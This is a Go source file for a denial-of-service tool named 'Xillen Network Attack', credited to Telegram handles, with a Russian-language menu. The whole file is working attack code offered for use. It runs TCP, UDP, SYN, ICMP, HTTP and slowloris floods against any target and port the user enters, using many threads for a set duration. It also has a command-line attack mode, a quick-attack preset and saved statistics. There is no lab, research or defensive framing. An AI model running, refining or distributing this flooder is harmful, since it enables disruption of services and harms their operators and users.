package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var author = "t.me/Bengamin_Button t.me/XillenAdapter"

type AttackConfig struct {
	Target     string `json:"target"`
	Port       int    `json:"port"`
	Threads    int    `json:"threads"`
	Duration   int    `json:"duration_seconds"`
	PacketSize int    `json:"packet_size"`
	Delay      int    `json:"delay_ms"`
	Method     string `json:"method"`
}

type AttackResult struct {
	Target      string    `json:"target"`
	StartTime   time.Time `json:"start_time"`
	EndTime     time.Time `json:"end_time"`
	Duration    int64     `json:"duration_ms"`
	PacketsSent int64     `json:"packets_sent"`
	BytesSent   int64     `json:"bytes_sent"`
	SuccessRate float64   `json:"success_rate"`
	Errors      int64     `json:"errors"`
	Method      string    `json:"method"`
}

type NetworkAttacker struct {
	configs       []AttackConfig
	results       []AttackResult
	mu            sync.RWMutex
	statistics    Statistics
	attackMethods map[string]func(AttackConfig) AttackResult
}

type Statistics struct {
	TotalAttacks  int64     `json:"total_attacks"`
	TotalPackets  int64     `json:"total_packets"`
	TotalBytes    int64     `json:"total_bytes"`
	TotalDuration int64     `json:"total_duration_ms"`
	StartTime     time.Time `json:"start_time"`
	LastAttack    time.Time `json:"last_attack"`
	SuccessRate   float64   `json:"success_rate"`
	Errors        int64     `json:"errors"`
}

func NewNetworkAttacker() *NetworkAttacker {
	attacker := &NetworkAttacker{
		configs:       make([]AttackConfig, 0),
		results:       make([]AttackResult, 0),
		statistics:    Statistics{StartTime: time.Now()},
		attackMethods: make(map[string]func(AttackConfig) AttackResult),
	}

	attacker.setupAttackMethods()
	return attacker
}

func (na *NetworkAttacker) setupAttackMethods() {
	na.attackMethods["tcp_flood"] = na.tcpFlood
	na.attackMethods["udp_flood"] = na.udpFlood
	na.attackMethods["syn_flood"] = na.synFlood
	na.attackMethods["icmp_flood"] = na.icmpFlood
	na.attackMethods["http_flood"] = na.httpFlood
	na.attackMethods["slowloris"] = na.slowloris
}

func (na *NetworkAttacker) tcpFlood(config AttackConfig) AttackResult {
	result := AttackResult{
		Target:    config.Target,
		StartTime: time.Now(),
		Method:    "TCP Flood",
	}

	var wg sync.WaitGroup
	var packetsSent, bytesSent, errors int64
	var mu sync.Mutex

	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			start := time.Now()
			for time.Since(start) < time.Duration(config.Duration)*time.Second {
				conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", config.Target, config.Port), 5*time.Second)
				if err != nil {
					mu.Lock()
					errors++
					mu.Unlock()
					continue
				}

				data := make([]byte, config.PacketSize)
				for j := range data {
					data[j] = byte(j % 256)
				}

				_, err = conn.Write(data)
				if err == nil {
					mu.Lock()
					packetsSent++
					bytesSent += int64(len(data))
					mu.Unlock()
				} else {
					mu.Lock()
					errors++
					mu.Unlock()
				}

				conn.Close()

				if config.Delay > 0 {
					time.Sleep(time.Duration(config.Delay) * time.Millisecond)
				}
			}
		}()
	}

	wg.Wait()

	result.EndTime = time.Now()
	result.Duration = result.EndTime.Sub(result.StartTime).Milliseconds()
	result.PacketsSent = packetsSent
	result.BytesSent = bytesSent
	result.Errors = errors

	if packetsSent > 0 {
		result.SuccessRate = float64(packetsSent) / float64(packetsSent+errors) * 100
	}

	return result
}

func (na *NetworkAttacker) udpFlood(config AttackConfig) AttackResult {
	result := AttackResult{
		Target:    config.Target,
		StartTime: time.Now(),
		Method:    "UDP Flood",
	}

	var wg sync.WaitGroup
	var packetsSent, bytesSent, errors int64
	var mu sync.Mutex

	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", config.Target, config.Port))
			if err != nil {
				mu.Lock()
				errors++
				mu.Unlock()
				return
			}
			defer conn.Close()

			start := time.Now()
			for time.Since(start) < time.Duration(config.Duration)*time.Second {
				data := make([]byte, config.PacketSize)
				for j := range data {
					data[j] = byte(j % 256)
				}

				_, err = conn.Write(data)
				if err == nil {
					mu.Lock()
					packetsSent++
					bytesSent += int64(len(data))
					mu.Unlock()
				} else {
					mu.Lock()
					errors++
					mu.Unlock()
				}

				if config.Delay > 0 {
					time.Sleep(time.Duration(config.Delay) * time.Millisecond)
				}
			}
		}()
	}

	wg.Wait()

	result.EndTime = time.Now()
	result.Duration = result.EndTime.Sub(result.StartTime).Milliseconds()
	result.PacketsSent = packetsSent
	result.BytesSent = bytesSent
	result.Errors = errors

	if packetsSent > 0 {
		result.SuccessRate = float64(packetsSent) / float64(packetsSent+errors) * 100
	}

	return result
}

func (na *NetworkAttacker) synFlood(config AttackConfig) AttackResult {
	result := AttackResult{
		Target:    config.Target,
		StartTime: time.Now(),
		Method:    "SYN Flood",
	}

	var wg sync.WaitGroup
	var packetsSent, bytesSent, errors int64
	var mu sync.Mutex

	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			start := time.Now()
			for time.Since(start) < time.Duration(config.Duration)*time.Second {
				conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", config.Target, config.Port), 1*time.Second)
				if err != nil {
					mu.Lock()
					errors++
					mu.Unlock()
					continue
				}

				mu.Lock()
				packetsSent++
				bytesSent += 64
				mu.Unlock()

				conn.Close()

				if config.Delay > 0 {
					time.Sleep(time.Duration(config.Delay) * time.Millisecond)
				}
			}
		}()
	}

	wg.Wait()

	result.EndTime = time.Now()
	result.Duration = result.EndTime.Sub(result.StartTime).Milliseconds()
	result.PacketsSent = packetsSent
	result.BytesSent = bytesSent
	result.Errors = errors

	if packetsSent > 0 {
		result.SuccessRate = float64(packetsSent) / float64(packetsSent+errors) * 100
	}

	return result
}

func (na *NetworkAttacker) icmpFlood(config AttackConfig) AttackResult {
	result := AttackResult{
		Target:    config.Target,
		StartTime: time.Now(),
		Method:    "ICMP Flood",
	}

	var wg sync.WaitGroup
	var packetsSent, bytesSent, errors int64
	var mu sync.Mutex

	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			conn, err := net.Dial("ip4:icmp", config.Target)
			if err != nil {
				mu.Lock()
				errors++
				mu.Unlock()
				return
			}
			defer conn.Close()

			start := time.Now()
			for time.Since(start) < time.Duration(config.Duration)*time.Second {
				data := make([]byte, config.PacketSize)
				for j := range data {
					data[j] = byte(j % 256)
				}

				_, err = conn.Write(data)
				if err == nil {
					mu.Lock()
					packetsSent++
					bytesSent += int64(len(data))
					mu.Unlock()
				} else {
					mu.Lock()
					errors++
					mu.Unlock()
				}

				if config.Delay > 0 {
					time.Sleep(time.Duration(config.Delay) * time.Millisecond)
				}
			}
		}()
	}

	wg.Wait()

	result.EndTime = time.Now()
	result.Duration = result.EndTime.Sub(result.StartTime).Milliseconds()
	result.PacketsSent = packetsSent
	result.BytesSent = bytesSent
	result.Errors = errors

	if packetsSent > 0 {
		result.SuccessRate = float64(packetsSent) / float64(packetsSent+errors) * 100
	}

	return result
}

func (na *NetworkAttacker) httpFlood(config AttackConfig) AttackResult {
	result := AttackResult{
		Target:    config.Target,
		StartTime: time.Now(),
		Method:    "HTTP Flood",
	}

	var wg sync.WaitGroup
	var packetsSent, bytesSent, errors int64
	var mu sync.Mutex

	httpRequest := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n", config.Target)

	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			start := time.Now()
			for time.Since(start) < time.Duration(config.Duration)*time.Second {
				conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", config.Target, config.Port), 5*time.Second)
				if err != nil {
					mu.Lock()
					errors++
					mu.Unlock()
					continue
				}

				_, err = conn.Write([]byte(httpRequest))
				if err == nil {
					mu.Lock()
					packetsSent++
					bytesSent += int64(len(httpRequest))
					mu.Unlock()
				} else {
					mu.Lock()
					errors++
					mu.Unlock()
				}

				conn.Close()

				if config.Delay > 0 {
					time.Sleep(time.Duration(config.Delay) * time.Millisecond)
				}
			}
		}()
	}

	wg.Wait()

	result.EndTime = time.Now()
	result.Duration = result.EndTime.Sub(result.StartTime).Milliseconds()
	result.PacketsSent = packetsSent
	result.BytesSent = bytesSent
	result.Errors = errors

	if packetsSent > 0 {
		result.SuccessRate = float64(packetsSent) / float64(packetsSent+errors) * 100
	}

	return result
}

func (na *NetworkAttacker) slowloris(config AttackConfig) AttackResult {
	result := AttackResult{
		Target:    config.Target,
		StartTime: time.Now(),
		Method:    "Slowloris",
	}

	var wg sync.WaitGroup
	var packetsSent, bytesSent, errors int64
	var mu sync.Mutex

	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", config.Target, config.Port), 5*time.Second)
			if err != nil {
				mu.Lock()
				errors++
				mu.Unlock()
				return
			}
			defer conn.Close()

			httpRequest := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\n", config.Target)
			_, err = conn.Write([]byte(httpRequest))
			if err != nil {
				mu.Lock()
				errors++
				mu.Unlock()
				return
			}

			mu.Lock()
			packetsSent++
			bytesSent += int64(len(httpRequest))
			mu.Unlock()

			start := time.Now()
			for time.Since(start) < time.Duration(config.Duration)*time.Second {
				time.Sleep(10 * time.Second)

				_, err = conn.Write([]byte("X-a: b\r\n"))
				if err != nil {
					break
				}

				mu.Lock()
				packetsSent++
				bytesSent += 8
				mu.Unlock()
			}
		}()
	}

	wg.Wait()

	result.EndTime = time.Now()
	result.Duration = result.EndTime.Sub(result.StartTime).Milliseconds()
	result.PacketsSent = packetsSent
	result.BytesSent = bytesSent
	result.Errors = errors

	if packetsSent > 0 {
		result.SuccessRate = float64(packetsSent) / float64(packetsSent+errors) * 100
	}

	return result
}

func (na *NetworkAttacker) AddAttack(config AttackConfig) {
	na.mu.Lock()
	defer na.mu.Unlock()

	na.configs = append(na.configs, config)
	fmt.Printf("✅ Атака добавлена: %s -> %s:%d (%s)\n",
		config.Method, config.Target, config.Port, config.Method)
}

func (na *NetworkAttacker) ExecuteAttack(config AttackConfig) AttackResult {
	fmt.Printf("🚀 Запуск атаки: %s -> %s:%d (%s)\n",
		config.Method, config.Target, config.Port, config.Method)

	method, exists := na.attackMethods[config.Method]
	if !exists {
		fmt.Printf("❌ Неизвестный метод атаки: %s\n", config.Method)
		return AttackResult{Errors: 1}
	}

	result := method(config)

	na.mu.Lock()
	na.results = append(na.results, result)
	na.statistics.TotalAttacks++
	na.statistics.TotalPackets += result.PacketsSent
	na.statistics.TotalBytes += result.BytesSent
	na.statistics.TotalDuration += result.Duration
	na.statistics.LastAttack = time.Now()
	na.statistics.Errors += result.Errors
	na.mu.Unlock()

	fmt.Printf("✅ Атака завершена: %d пакетов, %d байт, %.2f%% успех\n",
		result.PacketsSent, result.BytesSent, result.SuccessRate)

	return result
}

func (na *NetworkAttacker) ShowResults() {
	na.mu.RLock()
	defer na.mu.RUnlock()

	fmt.Println("\n=== РЕЗУЛЬТАТЫ АТАК ===")
	fmt.Printf("%-20s %-12s %-10s %-12s %-8s %-8s %-8s\n",
		"Цель", "Метод", "Пакеты", "Байты", "Ошибки", "Успех%", "Время(мс)")
	fmt.Println(strings.Repeat("-", 90))

	for _, result := range na.results {
		fmt.Printf("%-20s %-12s %-10d %-12d %-8d %-8.2f %-8d\n",
			result.Target, result.Method, result.PacketsSent,
			result.BytesSent, result.Errors, result.SuccessRate, result.Duration)
	}
}

func (na *NetworkAttacker) ShowStatistics() {
	na.mu.RLock()
	defer na.mu.RUnlock()

	uptime := time.Since(na.statistics.StartTime)

	fmt.Println("\n=== СТАТИСТИКА ===")
	fmt.Printf("Автор: %s\n", author)
	fmt.Printf("Время работы: %v\n", uptime)
	fmt.Printf("Всего атак: %d\n", na.statistics.TotalAttacks)
	fmt.Printf("Всего пакетов: %d\n", na.statistics.TotalPackets)
	fmt.Printf("Всего байт: %d\n", na.statistics.TotalBytes)
	fmt.Printf("Общее время: %d мс\n", na.statistics.TotalDuration)
	fmt.Printf("Ошибок: %d\n", na.statistics.Errors)
	fmt.Printf("Последняя атака: %s\n", na.statistics.LastAttack.Format("15:04:05"))

	if na.statistics.TotalPackets > 0 {
		avgSuccess := float64(na.statistics.TotalPackets) / float64(na.statistics.TotalPackets+na.statistics.Errors) * 100
		fmt.Printf("Средний успех: %.2f%%\n", avgSuccess)
	}
}

func (na *NetworkAttacker) SaveResults(filename string) error {
	na.mu.RLock()
	defer na.mu.RUnlock()

	data := map[string]interface{}{
		"metadata": map[string]interface{}{
			"author":     author,
			"timestamp":  time.Now().Format(time.RFC3339),
			"version":    "2.0.0",
			"statistics": na.statistics,
		},
		"results": na.results,
		"configs": na.configs,
	}

	jsonData, err := json.MarshalIndent(data, "", "  ")
	if err != nil {
		return err
	}

	return os.WriteFile(filename, jsonData, 0644)
}

func (na *NetworkAttacker) LoadResults(filename string) error {
	data, err := os.ReadFile(filename)
	if err != nil {
		return err
	}

	var resultData map[string]interface{}
	if err := json.Unmarshal(data, &resultData); err != nil {
		return err
	}

	if results, ok := resultData["results"].([]interface{}); ok {
		for _, r := range results {
			if resultBytes, err := json.Marshal(r); err == nil {
				var result AttackResult
				if err := json.Unmarshal(resultBytes, &result); err == nil {
					na.results = append(na.results, result)
				}
			}
		}
	}

	return nil
}

func (na *NetworkAttacker) InteractiveMode() {
	scanner := bufio.NewScanner(os.Stdin)

	for {
		fmt.Println("\n🌐 Xillen Network Attack")
		fmt.Printf("👨‍💻 Автор: %s\n", author)
		fmt.Println("\nОпции:")
		fmt.Println("1. Добавить атаку")
		fmt.Println("2. Выполнить атаку")
		fmt.Println("3. Показать результаты")
		fmt.Println("4. Показать статистику")
		fmt.Println("5. Сохранить результаты")
		fmt.Println("6. Загрузить результаты")
		fmt.Println("7. Создать быструю атаку")
		fmt.Println("8. Показать методы атак")
		fmt.Println("0. Выход")

		fmt.Print("\nВыберите опцию: ")
		scanner.Scan()
		choice := scanner.Text()

		switch choice {
		case "1":
			na.addAttackInteractive(scanner)

		case "2":
			na.executeAttackInteractive(scanner)

		case "3":
			na.ShowResults()

		case "4":
			na.ShowStatistics()

		case "5":
			fmt.Print("Введите имя файла: ")
			scanner.Scan()
			filename := scanner.Text()
			if err := na.SaveResults(filename); err != nil {
				fmt.Printf("❌ Ошибка сохранения: %v\n", err)
			} else {
				fmt.Printf("✅ Результаты сохранены в %s\n", filename)
			}

		case "6":
			fmt.Print("Введите имя файла: ")
			scanner.Scan()
			filename := scanner.Text()
			if err := na.LoadResults(filename); err != nil {
				fmt.Printf("❌ Ошибка загрузки: %v\n", err)
			} else {
				fmt.Printf("✅ Результаты загружены из %s\n", filename)
			}

		case "7":
			na.quickAttack(scanner)

		case "8":
			fmt.Println("\n📋 Доступные методы атак:")
			for method := range na.attackMethods {
				fmt.Printf("   - %s\n", method)
			}

		case "0":
			fmt.Println("👋 До свидания!")
			return

		default:
			fmt.Println("❌ Неверный выбор")
		}
	}
}

func (na *NetworkAttacker) addAttackInteractive(scanner *bufio.Scanner) {
	fmt.Print("Цель (IP/домен): ")
	scanner.Scan()
	target := scanner.Text()

	fmt.Print("Порт: ")
	scanner.Scan()
	portStr := scanner.Text()
	port, _ := strconv.Atoi(portStr)

	fmt.Print("Потоки: ")
	scanner.Scan()
	threadsStr := scanner.Text()
	threads, _ := strconv.Atoi(threadsStr)

	fmt.Print("Длительность (сек): ")
	scanner.Scan()
	durationStr := scanner.Text()
	duration, _ := strconv.Atoi(durationStr)

	fmt.Print("Размер пакета: ")
	scanner.Scan()
	packetSizeStr := scanner.Text()
	packetSize, _ := strconv.Atoi(packetSizeStr)

	fmt.Print("Задержка (мс): ")
	scanner.Scan()
	delayStr := scanner.Text()
	delay, _ := strconv.Atoi(delayStr)

	fmt.Print("Метод (tcp_flood/udp_flood/syn_flood/icmp_flood/http_flood/slowloris): ")
	scanner.Scan()
	method := scanner.Text()

	config := AttackConfig{
		Target:     target,
		Port:       port,
		Threads:    threads,
		Duration:   duration,
		PacketSize: packetSize,
		Delay:      delay,
		Method:     method,
	}

	na.AddAttack(config)
}

func (na *NetworkAttacker) executeAttackInteractive(scanner *bufio.Scanner) {
	if len(na.configs) == 0 {
		fmt.Println("❌ Нет настроенных атак")
		return
	}

	fmt.Println("Выберите атаку:")
	for i, config := range na.configs {
		fmt.Printf("%d. %s -> %s:%d (%s)\n", i+1, config.Method, config.Target, config.Port, config.Method)
	}

	fmt.Print("Номер атаки: ")
	scanner.Scan()
	choiceStr := scanner.Text()
	choice, _ := strconv.Atoi(choiceStr)

	if choice > 0 && choice <= len(na.configs) {
		na.ExecuteAttack(na.configs[choice-1])
	} else {
		fmt.Println("❌ Неверный выбор")
	}
}

func (na *NetworkAttacker) quickAttack(scanner *bufio.Scanner) {
	fmt.Print("Цель: ")
	scanner.Scan()
	target := scanner.Text()

	fmt.Print("Порт: ")
	scanner.Scan()
	portStr := scanner.Text()
	port, _ := strconv.Atoi(portStr)

	config := AttackConfig{
		Target:     target,
		Port:       port,
		Threads:    50,
		Duration:   30,
		PacketSize: 1024,
		Delay:      0,
		Method:     "tcp_flood",
	}

	fmt.Printf("🚀 Быстрая атака: %s:%d\n", target, port)
	na.ExecuteAttack(config)
}

func main() {
	fmt.Println(author)

	attacker := NewNetworkAttacker()

	if len(os.Args) > 1 {
		switch os.Args[1] {
		case "attack":
			if len(os.Args) > 4 {
				target := os.Args[2]
				port, _ := strconv.Atoi(os.Args[3])
				method := os.Args[4]

				config := AttackConfig{
					Target:     target,
					Port:       port,
					Threads:    10,
					Duration:   60,
					PacketSize: 1024,
					Delay:      0,
					Method:     method,
				}

				attacker.ExecuteAttack(config)
				return
			}
		}
	}

	attacker.InteractiveMode()
}
